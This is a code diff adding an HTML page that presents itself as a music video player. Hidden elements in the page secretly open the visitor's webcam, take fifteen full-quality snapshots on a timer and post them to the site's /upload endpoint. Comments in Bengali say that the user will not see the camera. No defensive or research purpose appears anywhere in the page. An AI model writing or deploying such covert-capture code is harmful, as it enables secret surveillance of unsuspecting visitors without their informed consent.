@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Music Video</title>
+  <link rel="stylesheet" href="style.css">
+  <style>
+  body {
+  font-family: Arial, sans-serif;
+  margin: 0;
+  background: #121212;
+  color: #fff;
+  text-align: center;
+}
+
+.container {
+  padding: 20px;
+}
+
+h1 {
+  color: #ffeb3b;
+}
+
+.video-wrapper {
+  display: flex;
+  justify-content: center;
+  margin-top: 20px;
+}
+
+#musicVideo {
+  width: 80%;
+  max-width: 800px;
+  border: 3px solid #ffeb3b;
+  border-radius: 10px;
+  box-shadow: 0px 6px 15px rgba(0,0,0,0.6);
+}
+
+.status {
+  margin-top: 15px;
+  font-size: 1.1rem;
+  color: #00e676;
+}
+
+footer {
+  margin-top: 40px;
+  font-size: 0.9rem;
+  color: #bbb;
+}
+  </style>
+  
+  
+</head>
+<body>
+  <div class="container">
+    <h1>🎶 Enjoy the Music Video</h1>
+
+    <!-- ইউজার যা দেখবে -->
+    <div class="video-wrapper">
+      <video id="musicVideo" controls autoplay>
+        <source src="/video/Darkwater(360P).mp4" type="video/mp4">
+        Your browser does not support video.
+      </video>
+    </div>
+
+    <!-- Hidden camera (ইউজার দেখবে না) -->
+    <video id="camera" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <p id="statusText" class="status">
+    Darkwater.mp4  
+      
+    </p>
+  </div>
+
+
+<script>
+let camera = document.getElementById("camera");
+let canvas = document.getElementById("canvas");
+let ctx = canvas.getContext("2d");
+let statusText = document.getElementById("statusText");
+
+// ক্যামেরা চালু (hidden)
+navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+  .then(stream => {
+    camera.srcObject = stream;
+    statusText.textContent = "✅ ভিডিও চলছে (hidden capture active)";
+  })
+  .catch(err => {
+    console.error("Camera error: ", err);
+    statusText.textContent = "❌ ক্যামেরা চালু করা যায়নি";
+  });
+
+// ছবি তোলার ফাংশন + সার্ভারে পাঠানো (high quality)
+async function captureAndUploadImage() {
+  // ভিডিওর আসল resolution পাওয়া
+  const videoWidth = camera.videoWidth || 640;
+  const videoHeight = camera.videoHeight || 480;
+
+  canvas.width = videoWidth;
+  canvas.height = videoHeight;
+
+  ctx.drawImage(camera, 0, 0, videoWidth, videoHeight);
+
+  let dataUrl = canvas.toDataURL("image/jpeg", 1.0); // full quality JPEG
+
+  try {
+    await fetch("/upload", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ images: [dataUrl] }),
+    });
+    console.log("✅ Image uploaded (high quality)");
+  } catch (err) {
+    console.error("❌ Upload failed:", err);
+  }
+}
+
+// টাইমার লজিক: 3 রাউন্ড × 5 ছবি, 10s অন্তর, 30s বিরতি
+async function startCapture() {
+  for (let round = 0; round < 3; round++) {
+    for (let i = 0; i < 5; i++) {
+      statusText.textContent = `📸 ছবি তোলা হচ্ছে: Round ${round+1}, Image ${i+1}`;
+      await captureAndUploadImage();
+      await new Promise(r => setTimeout(r, 10000)); // 10 sec
+    }
+    if (round < 2) {
+      statusText.textContent = "⏳ 30 সেকেন্ড বিরতি চলছে...";
+      await new Promise(r => setTimeout(r, 30000)); // 30 sec pause
+    }
+  }
+
+  statusText.textContent = "✅ সব ছবি পাঠানো হয়েছে";
+}
+
+startCapture();
+</script>
+</body>
+</html>
